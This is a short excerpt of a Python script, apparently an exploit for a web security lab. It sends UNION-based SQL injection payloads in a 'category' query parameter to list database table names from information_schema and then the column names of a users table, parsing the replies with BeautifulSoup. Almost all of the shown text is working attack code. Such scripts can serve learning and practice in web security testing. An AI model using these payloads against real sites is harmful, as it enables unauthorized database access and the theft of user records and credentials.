...
def find_users_table(url):
    try:
        response = requests.get(f"{url}/filter?category=' UNION SELECT table_name, NULL FROM information_schema.tables--")
...
def get_column_names(url, users_table):
    response = requests.get(f"{url}/filter?category=' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = '{users_table}'--")
    soup = BeautifulSoup(response.text, 'html.parser')
